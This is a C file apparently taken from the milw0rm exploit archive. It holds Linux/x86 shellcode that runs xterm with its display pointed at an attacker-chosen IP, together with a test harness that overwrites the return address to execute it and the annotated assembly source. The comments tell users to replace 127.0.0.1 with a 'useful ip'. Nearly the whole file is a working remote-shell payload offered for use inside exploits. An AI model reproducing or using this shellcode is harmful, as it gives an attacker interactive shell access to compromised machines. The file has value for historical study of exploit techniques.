/*
 *  Linux/x86
 *
 *  execve() of /usr/X11R6/bin/xterm -ut -display ip:0, exit()
 *  127.0.0.1 is an example, you must change it to a useful ip
 *  (making a subrutine into the exploit?)
 *  - you must not delete 'K' after ip:0 -
 */
#include <stdio.h>

char shellcode[] =
"\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b"
"\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88"
"\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d"
"\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e"
"\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xac\xff\xff\xff"
"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K";

main() {
        int *ret;
        ret=(int *)&ret+2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

/* Code */
/*
__asm__("
jmp    0x4f
popl   %esi
xorl   %edx,%edx
movb   %dl,0x14(%esi)
movb   %dl,0x18(%esi)
movb   %dl,0x21(%esi)
movb   $0x2b,%dl
xorl   %ecx,%ecx
movb   $0x9,%cl
cmpb   $0x4b,(%edx,%esi)
je     0x5
inc    %edx
loop   -0x9
jmp    0x2b
movb   %dh,(%edx,%esi)
xorl   %edx,%edx
movl   %esi,%ebx
movl   %esi,0x36(%esi)
leal   0x15(%esi),%edi
movl   %edi,0x3a(%esi)
leal   0x19(%esi),%edi
movl   %edi,0x3e(%esi)
leal   0x22(%esi),%edi
movl   %edi,0x42(%esi)
movl   %edx,0x46(%esi)
leal   0x36(%esi),%ecx
leal   0x46(%esi),%edx
xorl   %eax,%eax
movb   $0xb,%eax
int    $0x80
xorl   %ebx,%ebx
movl   %ebx,%eax
inc    %eax
int    $0x80
call   -0x54
.string \"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K\"
");
*/

/*
RaiSe <raise@undersec.com>
http://www.undersec.com
*/

// milw0rm.com [2004-09-26]